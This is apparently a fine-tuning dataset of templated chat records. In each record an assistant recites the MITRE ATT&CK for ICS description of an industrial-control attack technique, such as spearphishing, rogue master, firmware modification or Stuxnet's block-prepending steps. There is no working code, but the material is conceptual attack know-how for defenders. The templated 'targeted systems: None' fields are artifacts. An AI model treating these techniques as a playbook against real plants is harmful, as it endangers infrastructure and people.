{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Loss of Productivity and Revenue' and with the Id: T0828 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Loss of Productivity and Revenue' and with the Id: T0828 is described as follows: Adversaries may cause loss of productivity and revenue through disruption and even damage to the availability and integrity of control system operations, devices, and related processes. This technique may manifest as a direct effect of an ICS-targeting attack or tangentially, due to an IT-targeting attack against non-segregated environments. In cases where these operations or services are brought to a halt, the loss of productivity may eventually present an impact for the end-users or consumers of products and services. The disrupted supply-chain may result in supply shortages and increased prices, among other consequences. A ransomware attack on an Australian beverage company resulted in the shutdown of some manufacturing sites, including precautionary halts to protect key systems. (Citation: Paganini, Pierluigi June 2020) The company announced the potential for temporary shortages of their products following the attack. (Citation: Paganini, Pierluigi June 2020) (Citation: Lion Corporation June 2020) In the 2021 Colonial Pipeline ransomware incident, the pipeline was unable to transport approximately 2.5 million barrels of fuel per day to the East Coast.  (Citation: Colonial Pipeline Company May 2021). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Spearphishing Attachment' and with the Id: T0865 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Spearphishing Attachment' and with the Id: T0865 is described as follows: Adversaries may use a spearphishing attachment, a variant of spearphishing, as a form of a social engineering attack against specific targets. Spearphishing attachments are different from other forms of spearphishing in that they employ malware attached to an email. All forms of spearphishing are electronically delivered and target a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T0863) to gain execution and access. (Citation: Enterprise ATT&CK October 2019) A Chinese spearphishing campaign running from December 9, 2011 through February 29, 2012, targeted ONG organizations and their employees. The emails were constructed with a high level of sophistication to convince employees to open the malicious file attachments. (Citation: CISA AA21-201A Pipeline Intrusion July 2021). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Location Identification' and with the Id: T0825 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Location Identification' and with the Id: T0825 is described as follows: Adversaries may perform location identification using device data to inform operations and targeted impact for attacks. Location identification data can come in a number of forms, including geographic location, location relative to other control system devices, time zone, and current time. An adversary may use an embedded global positioning system (GPS) module in a device to figure out the physical coordinates of a device. NIST SP800-82 recommends that devices utilize GPS or another location determining mechanism to attach appropriate timestamps to log entries (Citation: Guidance - NIST SP800-82). While this assists in logging and event tracking, an adversary could use the underlying positioning mechanism to determine the general location of a device. An adversary can also infer the physical location of serially connected devices by using serial connection enumeration. An adversary attempt to attack and cause Impact could potentially affect other control system devices in close proximity. Device local-time and time-zone settings can also provide adversaries a rough indicator of device location, when specific geographic identifiers cannot be determined from the system.. The systems targeted by this attack pattern are: Windows, Control Server ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Autorun Image' and with the Id: T0895 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Autorun Image' and with the Id: T0895 is described as follows: Adversaries may leverage AutoRun functionality or scripts to execute malicious code. Devices configured to enable AutoRun functionality or legacy operating systems may be susceptible to abuse of these features to run malicious code stored on various forms of removeable media (i.e., USB, Disk Images [.ISO]). Commonly, AutoRun or AutoPlay are disabled in many operating systems configurations to mitigate against this technique. If a device is configured to enable AutoRun or AutoPlay, adversaries may execute code on the device by mounting the removable media to the device, either through physical or virtual means. This may be especially relevant for virtual machine environments where disk images may be dynamically mapped to a guest system on a hypervisor.  An example could include an adversary gaining access to a hypervisor through the management interface to modify a virtual machine\u2019s hardware configuration. They could then deploy an iso image with a malicious AutoRun script to cause the virtual machine to automatically execute the code contained on the disk image. This would enable the execution of malicious code within a virtual machine without needing any prior remote access to that system.. The systems targeted by this attack pattern are:  ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Drive-by Compromise' and with the Id: T0817 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Drive-by Compromise' and with the Id: T0817 is described as follows: Adversaries may gain access to a system during a drive-by compromise, when a user visits a website as part of a regular browsing session. With this technique, the user's web browser is targeted and exploited simply by visiting the compromised website. The adversary may target a specific community, such as trusted third party suppliers or other industry specific groups, which often visit the target website. This kind of targeted attack relies on a common interest, and is known as a strategic web compromise or watering hole attack. The National Cyber Awareness System (NCAS) has issued a Technical Alert (TA) regarding Russian government cyber activity targeting critical infrastructure sectors. (Citation: Cybersecurity & Infrastructure Security Agency March 2018) Analysis by DHS and FBI has noted two distinct categories of victims in the Dragonfly campaign on the Western energy sector: staging and intended targets. The adversary targeted the less secure networks of staging targets, including trusted third-party suppliers and related peripheral organizations. Initial access to the intended targets used watering hole attacks to target process control, ICS, and critical infrastructure related trade publications and informational websites.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Damage to Property' and with the Id: T0879 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Damage to Property' and with the Id: T0879 is described as follows: Adversaries may cause damage and destruction of property to infrastructure, equipment, and the surrounding environment when attacking control systems. This technique may result in device and operational equipment breakdown, or represent tangential damage from other techniques used in an attack. Depending on the severity of physical damage and disruption caused to control processes and systems, this technique may result in [Loss of Safety](https://attack.mitre.org/techniques/T0880). Operations that result in [Loss of Control](https://attack.mitre.org/techniques/T0827) may also cause damage to property, which may be directly or indirectly motivated by an adversary seeking to cause impact in the form of [Loss of Productivity and Revenue](https://attack.mitre.org/techniques/T0828). The German Federal Office for Information Security (BSI) reported a targeted attack on a steel mill under an incidents affecting business section of its 2014 IT Security Report. (Citation: BSI State of IT Security 2014)  These targeted attacks affected industrial operations and resulted in breakdowns of control system components and even entire installations. As a result of these breakdowns, massive impact and damage resulted from the uncontrolled shutdown of a blast furnace. A Polish student used a remote controller device to interface with the Lodz city tram system in Poland. (Citation: John Bill May 2017) (Citation: Shelley Smith February 2008) (Citation: Bruce Schneier January 2008) Using this remote, the student was able to capture and replay legitimate tram signals. This resulted in damage to impacted trams, people, and the surrounding property. Reportedly, four trams were derailed and were forced to make emergency stops. (Citation: Shelley Smith February 2008) Commands issued by the student may have also resulted in tram collisions, causing harm to those on board and the environment outside. (Citation: Bruce Schneier January 2008). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Spoof Reporting Message' and with the Id: T0856 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Spoof Reporting Message' and with the Id: T0856 is described as follows: Adversaries may spoof reporting messages in control system environments for evasion and to impair process control. In control systems, reporting messages contain telemetry data (e.g., I/O values) pertaining to the current state of equipment and the industrial process. Reporting messages are important for monitoring the normal operation of a system or identifying important events such as deviations from expected values. If an adversary has the ability to Spoof Reporting Messages, they can impact the control system in many ways. The adversary can Spoof Reporting Messages that state that the process is operating normally, as a form of evasion. The adversary could also Spoof Reporting Messages to make the defenders and operators think that other errors are occurring in order to distract them from the actual source of a problem. (Citation: Bonnie Zhu, Anthony Joseph, Shankar Sastry 2011) . The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploitation of Remote Services' and with the Id: T0866 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploitation of Remote Services' and with the Id: T0866 is described as follows: Adversaries may exploit a software vulnerability to take advantage of a programming error in a program, service, or within the operating system software or kernel itself to enable remote service abuse. A common goal for post-compromise exploitation of remote services is for initial access into and lateral movement throughout the ICS environment to enable access to targeted systems. (Citation: Enterprise ATT&CK)ICS asset owners and operators have been affected by ransomware (or disruptive malware masquerading as ransomware) migrating from enterprise IT to ICS environments: WannaCry, NotPetya, and BadRabbit. In each of these cases, self-propagating (wormable) malware initially infected IT networks, but through exploit (particularly the SMBv1-targeting MS17-010 vulnerability) spread to industrial networks, producing significant impacts. (Citation: Joe Slowik April 2019). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Default Credentials' and with the Id: T0812 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Default Credentials' and with the Id: T0812 is described as follows: Adversaries may leverage manufacturer or supplier set default credentials on control system devices. These default credentials may have administrative permissions and may be necessary for initial configuration of the device. It is general best practice to change the passwords for these accounts as soon as possible, but some manufacturers may have devices that have passwords or usernames that cannot be changed. (Citation: Keith Stouffer May 2015)Default credentials are normally documented in an instruction manual that is either packaged with the device, published online through official means, or published online through unofficial means. Adversaries may leverage default credentials that have not been properly modified or disabled.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'External Remote Services' and with the Id: T0822 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'External Remote Services' and with the Id: T0822 is described as follows: Adversaries may leverage external remote services as a point of initial access into your network. These services allow users to connect to internal network resources from external locations. Examples are VPNs, Citrix, and other access mechanisms. Remote service gateways often manage connections and credential authentication for these services. (Citation: Daniel Oakley, Travis Smith, Tripwire)External remote services allow administration of a control system from outside the system. Often, vendors and internal engineering groups have access to external remote services to control system networks via the corporate network. In some cases, this access is enabled directly from the internet. While remote access enables ease of maintenance when a control system is in a remote area, compromise of remote access solutions is a liability. The adversary may use these services to gain access to and execute attacks against a control system network. Access to valid accounts is often a requirement. As they look for an entry point into the control system network, adversaries may begin searching for existing point-to-point VPN implementations at trusted third party networks or through remote support employee connections where split tunneling is enabled. (Citation: Electricity Information Sharing and Analysis Center; SANS Industrial Control Systems March 2016). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Brute Force I/O' and with the Id: T0806 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Brute Force I/O' and with the Id: T0806 is described as follows: Adversaries may repetitively or successively change I/O point values to perform an action. Brute Force I/O may be achieved by changing either a range of I/O point values or a single point value repeatedly to manipulate a process function. The adversary's goal and the information they have about the target environment will influence which of the options they choose. In the case of brute forcing a range of point values, the adversary may be able to achieve an impact without targeting a specific point. In the case where a single point is targeted, the adversary may be able to generate instability on the process function associated with that particular point. Adversaries may use Brute Force I/O to cause failures within various industrial processes. These failures could be the result of wear on equipment or damage to downstream equipment.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Detect Program State' and with the Id: T0870 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Detect Program State' and with the Id: T0870 is described as follows: Adversaries may seek to gather information about the current state of a program on a PLC. State information reveals information about the program, including whether it's running, halted, stopped, or has generated an exception. This information may be leveraged as a verification of malicious program execution or to determine if a PLC is ready to download a new program.. The systems targeted by this attack pattern are: Windows, Field Controller/RTU/PLC/IED ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Adversary-in-the-Middle' and with the Id: T0830 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Adversary-in-the-Middle' and with the Id: T0830 is described as follows: Adversaries with privileged network access may seek to modify network traffic in real time using adversary-in-the-middle (AiTM) attacks. (Citation: Gabriel Sanchez October 2017) This type of attack allows the adversary to intercept traffic to and/or from a particular device on the network. If a AiTM attack is established, then the adversary has the ability to block, log, modify, or inject traffic into the communication stream. There are several ways to accomplish this attack, but some of the most-common are Address Resolution Protocol (ARP) poisoning and the use of a proxy. (Citation: Bonnie Zhu, Anthony Joseph, Shankar Sastry 2011)  An AiTM attack may allow an adversary to perform the following attacks:  [Block Reporting Message](https://attack.mitre.org/techniques/T0804), [Spoof Reporting Message](https://attack.mitre.org/techniques/T0856), [Modify Parameter](https://attack.mitre.org/techniques/T0836), [Unauthorized Command Message](https://attack.mitre.org/techniques/T0855). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploitation for Evasion' and with the Id: T0820 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploitation for Evasion' and with the Id: T0820 is described as follows: Adversaries may exploit a software vulnerability to take advantage of a programming error in a program, service, or within the operating system software or kernel itself to evade detection. Vulnerabilities may exist in software that can be used to disable or circumvent security features.  Adversaries may have prior knowledge through [Remote System Information Discovery](https://attack.mitre.org/techniques/T0888) about security features implemented on control devices. These device security features will likely be targeted directly for exploitation. There are examples of firmware RAM/ROM consistency checks on control devices being targeted by adversaries to enable the installation of malicious [System Firmware](https://attack.mitre.org/techniques/T0857).. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Loss of Control' and with the Id: T0827 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Loss of Control' and with the Id: T0827 is described as follows: Adversaries may seek to achieve a sustained loss of control or a runaway condition in which operators cannot issue any commands even if the malicious interference has subsided. (Citation: Corero) (Citation: Michael J. Assante and Robert M. Lee) (Citation: Tyson Macaulay)The German Federal Office for Information Security (BSI) reported a targeted attack on a steel mill in its 2014 IT Security Report.(Citation: BSI State of IT Security 2014) These targeted attacks affected industrial operations and resulted in breakdowns of control system components and even entire installations. As a result of these breakdowns, massive impact resulted in damage and unsafe conditions from the uncontrolled shutdown of a blast furnace.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Change Program State' and with the Id: T0875 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Change Program State' and with the Id: T0875 is described as follows: Adversaries may attempt to change the state of the current program on a control device. Program state changes may be used to allow for another program to take over control or be loaded onto the device.. The systems targeted by this attack pattern are: Field Controller/RTU/PLC/IED ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hooking' and with the Id: T0874 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hooking' and with the Id: T0874 is described as follows: Adversaries may hook into application programming interface (API) functions used by processes to redirect calls for execution and privilege escalation means. Windows processes often leverage these API functions to perform tasks that require reusable system resources. Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions. (Citation: Enterprise ATT&CK)One type of hooking seen in ICS involves redirecting calls to these functions via import address table (IAT) hooking. IAT hooking uses modifications to a process IAT, where pointers to imported API functions are stored. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Control Device Identification' and with the Id: T0808 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Control Device Identification' and with the Id: T0808 is described as follows: Adversaries may perform control device identification to determine the make and model of a target device. Management software and device APIs may be utilized by the adversary to gain this information. By identifying and obtaining device specifics, the adversary may be able to determine device vulnerabilities. This device information can also be used to understand device functionality and inform the decision to target the environment.. The systems targeted by this attack pattern are: Windows, Field Controller/RTU/PLC/IED ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Program Organization Units' and with the Id: T0844 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Program Organization Units' and with the Id: T0844 is described as follows: Program Organizational Units (POUs) are block structures used within PLC programming to create programs and projects. (Citation: Guidance - IEC61131) POUs can be used to hold user programs written in IEC 61131-3 languages: Structured text, Instruction list, Function block, and Ladder logic. (Citation: Guidance - IEC61131) Application - 201203 They can also provide additional functionality, such as establishing connections between the PLC and other devices using TCON. (Citation: PLCBlaster - Spenneberg)  Stuxnet uses a simple code-prepending infection technique to infect Organization Blocks (OB). For example, the following sequence of actions is performed when OB1 is infected  (Citation: Stuxnet - Symantec - 201102):*Increase the size of the original block.*Write malicious code to the beginning of the block.*Insert the original OB1 code after the malicious code.. The systems targeted by this attack pattern are: Windows, Safety Instrumented System/Protection Relay, Field Controller/RTU/PLC/IED ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Graphical User Interface' and with the Id: T0823 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Graphical User Interface' and with the Id: T0823 is described as follows: Adversaries may attempt to gain access to a machine via a Graphical User Interface (GUI) to enhance execution capabilities. Access to a GUI allows a user to interact with a computer in a more visual manner than a CLI. A GUI allows users to move a cursor and click on interface objects, with a mouse and keyboard as the main input devices, as opposed to just using the keyboard.If physical access is not an option, then access might be possible via protocols such as VNC on Linux-based and Unix-based operating systems, and RDP on Windows operating systems. An adversary can use this access to execute programs and applications on the target machine.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Rogue Master' and with the Id: T0848 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Rogue Master' and with the Id: T0848 is described as follows: Adversaries may setup a rogue master to leverage control server functions to communicate with outstations. A rogue master can be used to send legitimate control messages to other control system devices, affecting processes in unintended ways. It may also be used to disrupt network communications by capturing and receiving the network traffic meant for the actual master. Impersonating a master may also allow an adversary to avoid detection. In the case of the 2017 Dallas Siren incident, adversaries used a rogue master to send command messages to the 156 distributed sirens across the city, either through a single rogue transmitter with a strong signal, or using many distributed repeaters. (Citation: Bastille April 2017) (Citation: Zack Whittaker April 2017). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Native API' and with the Id: T0834 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Native API' and with the Id: T0834 is described as follows: Adversaries may directly interact with the native OS application programming interface (API) to access system functions. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. (Citation: The MITRE Corporation May 2017) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations. Functionality provided by native APIs are often also exposed to user-mode applications via interfaces and libraries. For example, functions such as memcpy and direct operations on memory registers can be used to modify user and system memory space.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Loss of Availability' and with the Id: T0826 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Loss of Availability' and with the Id: T0826 is described as follows: Adversaries may attempt to disrupt essential components or systems to prevent owner and operator from delivering products or services. (Citation: Corero) (Citation: Michael J. Assante and Robert M. Lee) (Citation: Tyson Macaulay) Adversaries may leverage malware to delete or encrypt critical data on HMIs, workstations, or databases.In the 2021 Colonial Pipeline ransomware incident, pipeline operations were temporally halted on May 7th and were not fully restarted until May 12th. (Citation: Colonial Pipeline Company May 2021). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Theft of Operational Information' and with the Id: T0882 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Theft of Operational Information' and with the Id: T0882 is described as follows: Adversaries may steal operational information on a production environment as a direct mission outcome for personal gain or to inform future operations. This information may include design documents, schedules, rotational data, or similar artifacts that provide insight on operations.    In the Bowman Dam incident, adversaries probed systems for operational data. (Citation: Mark Thompson March 2016) (Citation: Danny Yadron December 2015). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Firmware' and with the Id: T0857 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Firmware' and with the Id: T0857 is described as follows: System firmware on modern assets is often designed with an update feature. Older device firmware may be factory installed and require special reprograming equipment. When available, the firmware update feature enables vendors to remotely patch bugs and perform upgrades. Device firmware updates are often delegated to the user and may be done using a software update package. It may also be possible to perform this task over the network. An adversary may exploit the firmware update feature on accessible devices to upload malicious or out-of-date firmware. Malicious modification of device firmware may provide an adversary with root access to a device, given firmware is one of the lowest programming abstraction layers. (Citation: Basnight, Zachry, et al.). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Masquerading' and with the Id: T0849 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Masquerading' and with the Id: T0849 is described as follows: Adversaries may use masquerading to disguise a malicious application or executable as another file, to avoid operator and engineer suspicion. Possible disguises of these masquerading files can include commonly found programs, expected vendor executables and configuration files, and other commonplace application and naming conventions. By impersonating expected and vendor-relevant files and applications, operators and engineers may not notice the presence of the underlying malicious content and possibly end up running those masquerading as legitimate functions. Applications and other files commonly found on Windows systems or in engineering workstations have been impersonated before. This can be as simple as renaming a file to effectively disguise it in the ICS environment.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Program Download' and with the Id: T0843 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Program Download' and with the Id: T0843 is described as follows: Adversaries may perform a program download to transfer a user program to a controller. Variations of program download, such as online edit and program append, allow a controller to continue running during the transfer and reconfiguration process without interruption to process control. However, before starting a full program download (i.e., download all) a controller may need to go into a stop state. This can have negative consequences on the physical process, especially if the controller is not able to fulfill a time-sensitive action. Adversaries may choose to avoid a download all in favor of an online edit or program append to avoid disrupting the physical process. An adversary may need to use the technique Detect Operating Mode or Change Operating Mode to make sure the controller is in the proper mode to accept a program download.The granularity of control to transfer a user program in whole or parts is dictated by the management protocol (e.g., S7CommPlus, TriStation) and underlying controller API. Thus, program download is a high-level term for the suite of vendor-specific API calls used to configure a controllers user program memory space.  [Modify Controller Tasking](https://attack.mitre.org/techniques/T0821) and [Modify Program](https://attack.mitre.org/techniques/T0889) represent the configuration changes that are transferred to a controller via a program download.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Replication Through Removable Media' and with the Id: T0847 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Replication Through Removable Media' and with the Id: T0847 is described as follows: Adversaries may move onto systems, such as those separated from the enterprise network, by copying malware to removable media which is inserted into the control systems environment. The adversary may rely on unknowing trusted third parties, such as suppliers or contractors with access privileges, to introduce the removable media. This technique enables initial access to target devices that never connect to untrusted networks, but are physically accessible.     Operators of the German nuclear power plant, Gundremmingen, discovered malware on a facility computer not connected to the internet. (Citation: Kernkraftwerk Gundremmingen April 2016) (Citation: Trend Micro April 2016) The malware included Conficker and W32.Ramnit, which were also found on eighteen removable disk drives in the facility. (Citation: Christoph Steitz, Eric Auchard April 2016) (Citation: Catalin Cimpanu April 2016) (Citation: Peter Dockrill April 2016) (Citation: Lee Mathews April 2016) (Citation: Sean Gallagher April 2016) (Citation: Dark Reading Staff April 2016) The plant has since checked for infection and cleaned up more than 1,000 computers. (Citation: BBC April 2016) An ESET researcher commented that internet disconnection does not guarantee system safety from infection or payload execution. (Citation: ESET April 2016). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Screen Capture' and with the Id: T0852 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Screen Capture' and with the Id: T0852 is described as follows: Adversaries may attempt to perform screen capture of devices in the control system environment. Screenshots may be taken of workstations, HMIs, or other devices that display environment-relevant process, device, reporting, alarm, or related data. These device displays may reveal information regarding the ICS process, layout, control, and related schematics. In particular, an HMI can provide a lot of important industrial process information. (Citation: ICS-CERT October 2017) Analysis of screen captures may provide the adversary with an understanding of intended operations and interactions between critical devices.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hardcoded Credentials' and with the Id: T0891 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hardcoded Credentials' and with the Id: T0891 is described as follows: Adversaries may leverage credentials that are hardcoded in software or firmware to gain an unauthorized interactive user session to an asset. Examples credentials that may be hardcoded in an asset include:* Username/Passwords* Cryptographic keys/Certificates* API tokensUnlike [Default Credentials](https://attack.mitre.org/techniques/T0812), these credentials are built into the system in a way that they either cannot be changed by the asset owner, or may be infeasible to change because of the impact it would cause to the control system operation. These credentials may be reused across whole product lines or device models and are often not published or known to the owner and operators of the asset. Adversaries may utilize these hardcoded credentials to move throughout the control system environment or provide reliable access for their tools to interact with industrial assets. . The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Valid Accounts' and with the Id: T0859 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Valid Accounts' and with the Id: T0859 is described as follows: Adversaries may steal the credentials of a specific user or service account using credential access techniques. In some cases, default credentials for control system devices may be publicly available. Compromised credentials may be used to bypass access controls placed on various resources on hosts and within the network, and may even be used for persistent access to remote systems. Compromised and default credentials may also grant an adversary increased privilege to specific systems and devices or access to restricted areas of the network. Adversaries may choose not to use malware or tools, in conjunction with the legitimate access those credentials provide, to make it harder to detect their presence or to control devices and send legitimate commands in an unintended way. Adversaries may also create accounts, sometimes using predefined account names and passwords, to provide a means of backup access for persistence. (Citation: Booz Allen Hamilton) The overlap of credentials and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator)  and possibly between the enterprise and operational technology environments. Adversaries may be able to leverage valid credentials from one system to gain access to another system.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploitation for Privilege Escalation' and with the Id: T0890 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploitation for Privilege Escalation' and with the Id: T0890 is described as follows: Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions. (Citation: The MITRE Corporation) When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods. (Citation: The MITRE Corporation). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Remote System Discovery' and with the Id: T0846 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Remote System Discovery' and with the Id: T0846 is described as follows: Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for subsequent Lateral Movement or Discovery techniques. Functionality could exist within adversary tools to enable this, but utilities available on the operating system or vendor software could also be used. (Citation: Enterprise ATT&CK January 2018). The systems targeted by this attack pattern are: None ."}]}
